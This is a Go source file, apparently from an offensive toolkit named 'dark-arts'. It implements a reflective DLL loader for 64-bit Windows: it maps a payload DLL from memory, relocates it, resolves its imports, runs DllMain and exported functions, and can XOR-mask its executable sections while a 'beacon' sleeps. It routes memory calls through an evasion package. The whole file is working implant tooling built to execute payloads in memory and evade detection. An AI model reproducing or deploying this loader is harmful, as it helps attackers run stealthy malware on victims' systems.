//go:build windows && amd64

package reflective

import (
	"encoding/binary"
	"errors"
	"fmt"

	"dark-arts/pkg/evasion"
	"dark-arts/pkg/sleepmask"
)

func callFn(fn uintptr, a, b, c uintptr) uintptr

// Options tunes how a payload DLL is mapped.
type Options struct {
	// Mask registers the executable sections with the process sleep mask
	// so they are XORed + NOACCESS while the beacon sleeps. Only safe for
	// dormant payloads (nothing executes while masked).
	Mask bool
}

// Module is a payload DLL mapped into the current process.
type Module struct {
	Base uintptr
	Size uintptr
}

const (
	pageRW  = 0x04
	pageRX  = 0x20
	pageR   = 0x02
	pageNo  = 0x01
	pageRWX = 0x40
)

var (
	ErrNotPE   = errors.New("reflective: payload is not a PE image")
	ErrNoReloc = errors.New("reflective: no relocation directory and preferred base unavailable")
	ErrTLS     = errors.New("reflective: TLS directory present (unsupported)")
)

// Load maps a DLL from memory into the current process and runs its entry
// point with DLL_PROCESS_ATTACH. The image is copied, relocated and its
// import address table resolved before the entry point runs.
func Load(payload []byte, opts Options) (*Module, error) {
	dos := binary.LittleEndian.Uint32(payload[0:4])
	if dos != 0x5A4D {
		return nil, ErrNotPE
	}
	peOff := uint32(binary.LittleEndian.Uint32(payload[0x3C:]))
	if peOff+24 > uint32(len(payload)) {
		return nil, ErrNotPE
	}
	if string(payload[peOff:peOff+4]) != "PE\x00\x00" {
		return nil, ErrNotPE
	}
	coff := peOff + 4
	machine := binary.LittleEndian.Uint16(payload[coff+0:])
	numSecs := int(binary.LittleEndian.Uint16(payload[coff+2:]))
	if machine != 0x8664 {
		return nil, fmt.Errorf("reflective: unsupported machine 0x%04X", machine)
	}
	opt := coff + 20
	if opt+0xF0 > uint32(len(payload)) {
		return nil, errors.New("reflective: truncated optional header")
	}
	if binary.LittleEndian.Uint16(payload[opt:]) != 0x20B {
		return nil, errors.New("reflective: not a PE32+ image")
	}
	sizeOfImage := uint32(binary.LittleEndian.Uint32(payload[opt+0x38:]))
	sizeOfHeaders := uint32(binary.LittleEndian.Uint32(payload[opt+0x3C:]))
	entryRVA := uint32(binary.LittleEndian.Uint32(payload[opt+0x10:]))
	imageBase := binary.LittleEndian.Uint64(payload[opt+0x18:])
	secAlign := uint32(binary.LittleEndian.Uint32(payload[opt+0x20:]))
	numDirs := uint32(binary.LittleEndian.Uint32(payload[opt+0x6C:]))
	if numDirs < 6 {
		return nil, errors.New("reflective: data directories truncated")
	}
	importDir := binary.LittleEndian.Uint32(payload[opt+0x78:])
	relocDir := binary.LittleEndian.Uint32(payload[opt+0x98:])
	tlsDir := binary.LittleEndian.Uint32(payload[opt+0xB8:])
	if tlsDir != 0 {
		return nil, ErrTLS
	}
	if sizeOfImage == 0 || sizeOfImage > 0x10000000 {
		return nil, errors.New("reflective: implausible SizeOfImage")
	}
	if secAlign != 0x1000 && secAlign != 0x200 {
		return nil, fmt.Errorf("reflective: unsupported section alignment 0x%X", secAlign)
	}
	if numSecs < 1 || numSecs > 96 {
		return nil, fmt.Errorf("reflective: implausible section count %d", numSecs)
	}
	secTab := opt + 0xF0
	if uint32(secTab)+uint32(numSecs)*40 > uint32(len(payload)) {
		return nil, errors.New("reflective: section table truncated")
	}

	base, err := evasion.AllocateVirtualMemory(evasion.CurrentProcess, uintptr(sizeOfImage), pageRW)
	if err != nil {
		return nil, err
	}
	fail := func(e error) (*Module, error) {
		evasion.FreeVirtualMemory(evasion.CurrentProcess, base)
		return nil, e
	}

	// Copy headers (zeroed up to SizeOfHeaders, then file bytes), then each
	// section's raw data with zero-fill of the virtual gap.
	for i := 0; i < int(sizeOfHeaders); i++ {
		wr8(base+uintptr(i), 0)
	}
	hdrs := sizeOfHeaders
	if hdrs > uint32(len(payload)) {
		hdrs = uint32(len(payload))
	}
	for i := 0; i < int(hdrs); i++ {
		wr8(base+uintptr(i), payload[i])
	}
	for s := 0; s < numSecs; s++ {
		sh := secTab + uint32(s)*40
		va := binary.LittleEndian.Uint32(payload[sh+12:])
		vs := binary.LittleEndian.Uint32(payload[sh+8:])
		rawSize := binary.LittleEndian.Uint32(payload[sh+16:])
		rawPtr := binary.LittleEndian.Uint32(payload[sh+20:])
		if vs == 0 {
			vs = rawSize
		}
		if vs > sizeOfImage || va+vs > sizeOfImage {
			return fail(fmt.Errorf("reflective: section %d out of image", s))
		}
		if rawSize > 0 {
			if rawPtr+rawSize > uint32(len(payload)) {
				return fail(fmt.Errorf("reflective: section %d raw data truncated", s))
			}
			for i := 0; i < int(rawSize); i++ {
				wr8(base+uintptr(va)+uintptr(i), payload[rawPtr+uint32(i)])
			}
		}
		for i := rawSize; i < vs; i++ {
			wr8(base+uintptr(va)+uintptr(i), 0)
		}
	}

	// Relocations are required whenever the image is not at its preferred
	// base (our allocation is anywhere NT chooses, so almost always).
	if uint64(base) != imageBase {
		if relocDir == 0 {
			return fail(ErrNoReloc)
		}
		if err := applyRelocs(base, relocDir, uint64(base)-imageBase); err != nil {
			return fail(err)
		}
	}

	if importDir != 0 {
		if err := resolveImports(base, importDir); err != nil {
			return fail(err)
		}
	}

	// Restore per-section protection from characteristics.
	var rxRanges [][2]uintptr
	for s := 0; s < numSecs; s++ {
		sh := secTab + uint32(s)*40
		va := uintptr(binary.LittleEndian.Uint32(payload[sh+12:]))
		vs := uintptr(binary.LittleEndian.Uint32(payload[sh+8:]))
		chars := binary.LittleEndian.Uint32(payload[sh+36:])
		if vs == 0 {
			continue
		}
		prot := protectionOf(chars)
		if prot == pageNo {
			continue
		}
		if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, base+va, vs, prot); err != nil {
			return fail(fmt.Errorf("reflective: protect section %d: %w", s, err))
		}
		if opts.Mask && prot == pageRX {
			rxRanges = append(rxRanges, [2]uintptr{base + va, vs})
		}
	}

	mod := &Module{Base: base, Size: uintptr(sizeOfImage)}
	if entryRVA != 0 {
		if ret := callFn(base+uintptr(entryRVA), base, 1, 0); ret == 0 {
			return fail(errors.New("reflective: DllMain returned FALSE"))
		}
	}
	if opts.Mask {
		for _, r := range rxRanges {
			sleepmask.MaskSelfRegion(r[0], r[1], pageRX)
		}
	}
	return mod, nil
}

// Call invokes a named export of the module and returns rax.
func Call(mod *Module, name string) (uintptr, error) {
	if mod == nil {
		return 0, errors.New("reflective: nil module")
	}
	base := uintptr(mod.Base)
	nt := base + uintptr(rd32(base+0x3C))
	opt := nt + 0x18
	expRVA := uintptr(rd32(opt + 0x70))
	if expRVA == 0 {
		return 0, errors.New("reflective: module has no exports")
	}
	exp := base + expRVA
	numNames := rd32(exp + 0x18)
	numFuncs := rd32(exp + 0x14)
	if numNames == 0 || numNames > 1<<20 || numFuncs == 0 {
		return 0, errors.New("reflective: malformed export directory")
	}
	funcsRVA := uintptr(rd32(exp + 0x1C))
	namesRVA := uintptr(rd32(exp + 0x20))
	ordsRVA := uintptr(rd32(exp + 0x24))
	for i := uint32(0); i < numNames; i++ {
		nameRVA := uintptr(rd32(base + namesRVA + uintptr(i)*4))
		if nameRVA == 0 || !nameEquals(base, nameRVA, name) {
			continue
		}
		ord := uint32(rd16(base + ordsRVA + uintptr(i)*2))
		if ord >= numFuncs {
			return 0, errors.New("reflective: export ordinal out of range")
		}
		fnRVA := uintptr(rd32(base + funcsRVA + uintptr(ord)*4))
		if fnRVA == 0 || fnRVA >= mod.Size {
			return 0, errors.New("reflective: export outside image")
		}
		return callFn(base+fnRVA, base, 0, 0), nil
	}
	return 0, fmt.Errorf("reflective: export %q not found", name)
}

// LoadAndRun maps the DLL and invokes an export after attach, returning its
// return value.
func LoadAndRun(payload []byte, fn string, opts Options) (uintptr, *Module, error) {
	mod, err := Load(payload, opts)
	if err != nil {
		return 0, nil, err
	}
	if fn == "" {
		return 0, mod, nil
	}
	ret, err := Call(mod, fn)
	if err != nil {
		return 0, mod, err
	}
	return ret, mod, nil
}
